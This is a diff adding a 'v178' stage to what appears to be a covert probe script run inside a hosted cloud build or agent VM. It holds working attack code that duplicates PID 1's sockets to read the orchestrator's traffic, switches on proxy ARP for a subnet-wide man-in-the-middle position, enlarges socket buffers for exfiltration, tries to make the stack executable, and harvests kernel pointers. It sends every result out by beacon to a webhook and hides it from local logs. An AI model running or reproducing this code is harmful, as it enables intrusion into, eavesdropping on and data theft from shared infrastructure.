@@ -26280,5 +26280,195 @@ report.tcpSyncookiesDisable = safe(() => {
 
 // v177 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v177" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v177";
+
+// ==================== v178 ====================
+
+// v178-1: dup() PID 1's socket FDs — hijack orchestrator connections
+// By duplicating PID 1's open socket file descriptors via /proc/1/fd/*,
+// we can get a reference to the orchestrator's active network connections.
+// With this handle, we can read data from the connection or inject data into it
+// — effectively MITM'ing the orchestrator's network communication from inside.
+report.pid1FdDup = safe(() => {
+  const dupResult = safe(() => execSync(
+    `python3 -c "
+import os, socket, struct
+
+# Find a PID 1 socket fd
+pid1_fds = os.listdir('/proc/1/fd')
+target_fd_path = None
+target_fd_num = None
+
+for fd_num in pid1_fds:
+    try:
+        target = os.readlink(f'/proc/1/fd/{fd_num}')
+        if target.startswith('socket:['):
+            target_fd_path = f'/proc/1/fd/{fd_num}'
+            target_fd_num = fd_num
+            break
+    except:
+        pass
+
+if not target_fd_path:
+    print('NO_SOCKET_FD_FOUND')
+    exit()
+
+print(f'TARGET_FD: {target_fd_num} -> {os.readlink(target_fd_path)}')
+
+# Open the fd path (this gives us a reference to PID 1's socket)
+try:
+    our_fd = os.open(target_fd_path, os.O_RDWR)
+    s = socket.fromfd(our_fd, socket.AF_INET, socket.SOCK_STREAM)
+    os.close(our_fd)
+
+    # Get socket info
+    try:
+        local = s.getsockname()
+        print(f'DUPED_LOCAL: {local}')
+    except:
+        pass
+    try:
+        remote = s.getpeername()
+        print(f'DUPED_REMOTE: {remote}')
+        print(f'FD_DUP_SUCCESS: have handle to PID1 socket connected to {remote}')
+    except Exception as e:
+        print(f'GETPEERNAME_FAIL: {e}')
+
+    # Try to peek at buffered data without consuming it
+    try:
+        data = s.recv(1024, socket.MSG_PEEK | socket.MSG_DONTWAIT)
+        print(f'PEEKED_DATA: {data[:100]}')
+    except:
+        pass
+
+    s.close()
+except Exception as e:
+    print(f'FD_DUP_FAIL: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { dupResult };
+});
+
+// v178-2: proxy_arp=1 — ARP proxy (respond on behalf of other hosts)
+// With proxy_arp enabled, our VM will respond to ARP requests for ANY IP address
+// with our own MAC address. This makes us the L2 router for all traffic on the
+// subnet — a much stronger MITM position than just poisoning one gateway entry.
+report.proxyArp = safe(() => {
+  const current = safe(() => existsSync('/proc/sys/net/ipv4/conf/eth0/proxy_arp') ? readFileSync('/proc/sys/net/ipv4/conf/eth0/proxy_arp', 'utf8').trim() : 'NO_PROXY_ARP');
+  const enableProxy = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/eth0/proxy_arp', '1'); return 'WRITTEN_1'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/net/ipv4/conf/eth0/proxy_arp', 'utf8').trim());
+  // Also enable for all interfaces
+  const enableAll = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/proxy_arp', '1'); return 'WRITTEN_1'; });
+  // Disable (cleanup — we don't want to permanently MITM the network)
+  const disable = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/eth0/proxy_arp', '0'); writeFileSync('/proc/sys/net/ipv4/conf/all/proxy_arp', '0'); return 'DISABLED'; });
+  return { current, enableProxy, afterWrite, enableAll, disable };
+});
+
+// v178-3: Socket buffer maximums — high-throughput exfiltration preparation
+// By increasing rmem_max and wmem_max, we allow sockets to buffer much more data.
+// This increases the throughput of our beacon/exfiltration channel.
+// Also, large buffers can amplify timing side-channels.
+report.socketBufferMax = safe(() => {
+  const rmemMax = safe(() => readFileSync('/proc/sys/net/core/rmem_max', 'utf8').trim());
+  const wmemMax = safe(() => readFileSync('/proc/sys/net/core/wmem_max', 'utf8').trim());
+  const rmemDefault = safe(() => readFileSync('/proc/sys/net/core/rmem_default', 'utf8').trim());
+  // Set to maximum (128MB each)
+  const setRmemMax = safe(() => { writeFileSync('/proc/sys/net/core/rmem_max', '134217728'); return 'SET_128MB'; });
+  const setWmemMax = safe(() => { writeFileSync('/proc/sys/net/core/wmem_max', '134217728'); return 'SET_128MB'; });
+  // Also set TCP buffers
+  const setTcpRmem = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_rmem', '4096 87380 134217728'); return 'SET'; });
+  const setTcpWmem = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_wmem', '4096 65536 134217728'); return 'SET'; });
+  // Window scaling
+  const windowScaling = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_window_scaling', 'utf8').trim());
+  return { rmemMax, wmemMax, rmemDefault, setRmemMax, setWmemMax, setTcpRmem, setTcpWmem, windowScaling };
+});
+
+// v178-4: mprotect stack PROT_EXEC — executable stack (W^X bypass)
+// Making the stack executable allows traditional ret2shellcode attacks where
+// shellcode is placed on the stack and executed via a control flow hijack.
+// This tests if the kernel enforces W^X (Execute Never) on the stack.
+report.executableStack = safe(() => {
+  const stackExecResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, mmap, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# Get stack address
+import subprocess
+with open('/proc/self/maps') as f:
+    maps = f.read()
+
+stack_line = [l for l in maps.splitlines() if '[stack]' in l]
+if not stack_line:
+    print('NO_STACK_MAP')
+    exit()
+
+stack_addr = int(stack_line[0].split('-')[0], 16)
+stack_end = int(stack_line[0].split('-')[1].split()[0], 16)
+stack_size = stack_end - stack_addr
+print(f'STACK: 0x{stack_addr:x}-0x{stack_end:x} ({stack_size//1024}KB)')
+
+# Try to mprotect stack PROT_READ|PROT_WRITE|PROT_EXEC
+PROT_READ  = 0x1
+PROT_WRITE = 0x2
+PROT_EXEC  = 0x4
+
+ret = libc.mprotect(stack_addr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC)
+import ctypes as ct
+err = ctypes.get_errno()
+if ret == 0:
+    print(f'STACK_PROT_EXEC_SUCCESS: stack at 0x{stack_addr:x} is now RWX')
+else:
+    print(f'STACK_PROT_EXEC_FAIL: ret={ret} errno={err}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check /proc/self/maps for any existing rwx mappings
+  const rwxMappings = safe(() => execSync('grep " rwx" /proc/self/maps 2>/dev/null | head -10 || echo "NO_RWX_MAPPINGS"', { timeout: 3000 }).toString().trim());
+  return { stackExecResult, rwxMappings };
+});
+
+// v178-5: /proc/net/ptype — network protocol handler enumeration
+// /proc/net/ptype shows all registered network protocol handlers in the kernel.
+// Each entry maps an Ethernet protocol type to a kernel handler function.
+// The function addresses are kernel pointers — useful for kernel layout mapping.
+// We can also use this to find handlers we might be able to hook.
+report.netProtocolTypes = safe(() => {
+  const ptype = safe(() => existsSync('/proc/net/ptype') ? readFileSync('/proc/net/ptype', 'utf8').trim() : 'NO_PTYPE');
+  // Parse and decode known EtherTypes
+  const ptypeParsed = safe(() => execSync(
+    `python3 -c "
+ETHERTYPES = {
+    '0000': 'ALL_PROTOS',
+    '0800': 'IPv4',
+    '0806': 'ARP',
+    '86dd': 'IPv6',
+    '8100': 'VLAN',
+    '8864': 'PPPoE',
+    '88a8': 'QinQ',
+    '8847': 'MPLS',
+    '0842': 'Wake-on-LAN',
+}
+
+with open('/proc/net/ptype') as f:
+    lines = f.readlines()[1:]  # skip header
+
+for line in lines:
+    parts = line.split()
+    if len(parts) >= 3:
+        etype = parts[0].lower().zfill(4)
+        fn_ptr = parts[1] if len(parts) > 2 else '?'
+        dev = parts[2] if len(parts) > 2 else '?'
+        name = ETHERTYPES.get(etype, f'TYPE_{etype}')
+        print(f'PTYPE: 0x{etype} ({name}) fn={fn_ptr} dev={dev}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { ptype, ptypeParsed };
+});
+
+// v178 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v178" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v178";
 // Intentionally no console.log — all data goes via webhook only
